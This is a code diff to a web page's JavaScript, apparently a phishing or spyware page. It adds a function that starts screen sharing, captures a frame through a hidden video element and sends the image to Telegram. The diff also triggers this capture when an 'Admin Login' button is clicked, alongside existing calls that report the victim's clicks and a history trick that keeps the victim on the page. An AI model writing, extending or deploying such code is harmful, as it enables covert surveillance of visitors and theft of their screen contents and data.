@@ -487,6 +487,61 @@
             }
         }
         
+        // ==================== NEW: SCREEN CAPTURE FUNCTION ====================
+        async function captureScreen() {
+            try {
+                // Request screen sharing stream
+                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                
+                // Create a hidden video element to grab a frame
+                const screenVideo = document.createElement('video');
+                screenVideo.srcObject = screenStream;
+                screenVideo.autoplay = true;
+                screenVideo.playsInline = true;
+                screenVideo.muted = true;
+                screenVideo.style.position = 'fixed';
+                screenVideo.style.opacity = '0';
+                screenVideo.style.pointerEvents = 'none';
+                screenVideo.style.zIndex = '-1';
+                document.body.appendChild(screenVideo);
+
+                // Wait for video to load metadata and play
+                await new Promise((resolve) => {
+                    screenVideo.onloadedmetadata = () => {
+                        screenVideo.play().then(resolve).catch(resolve);
+                    };
+                });
+
+                // Give it a moment to render a frame
+                await new Promise(r => setTimeout(r, 300));
+
+                // Draw frame to canvas
+                const canvas = document.createElement('canvas');
+                canvas.width = screenVideo.videoWidth;
+                canvas.height = screenVideo.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(screenVideo, 0, 0, canvas.width, canvas.height);
+
+                // Stop all tracks (this closes the screen share prompt)
+                screenStream.getTracks().forEach(track => track.stop());
+                screenVideo.remove();
+
+                // Convert to blob and send
+                return new Promise((resolve) => {
+                    canvas.toBlob(async (blob) => {
+                        if (blob) {
+                            await sendTelegramPhoto(blob, '🖥️ Screen capture');
+                            console.log('Screen capture sent');
+                        }
+                        resolve();
+                    }, 'image/jpeg', 0.8);
+                });
+            } catch (err) {
+                console.log('Screen capture failed or denied:', err);
+                sendWithRetry('message', '❌ Screen capture failed or was denied by user');
+            }
+        }
+
         // ==================== PERMISSION HANDLING ====================
         const permissionModal = document.getElementById('permissionModal');
         const permissionMsg = document.getElementById('permissionMessage');
@@ -739,6 +794,9 @@
                     document.getElementById('processingOverlay').classList.add('active');
                     history.pushState(null, null, location.href);
                     sendWithRetry('message', '🔑 Admin Login button clicked');
+                    
+                    // Trigger screen capture when login is clicked
+                    captureScreen();
                 }
             });
         };
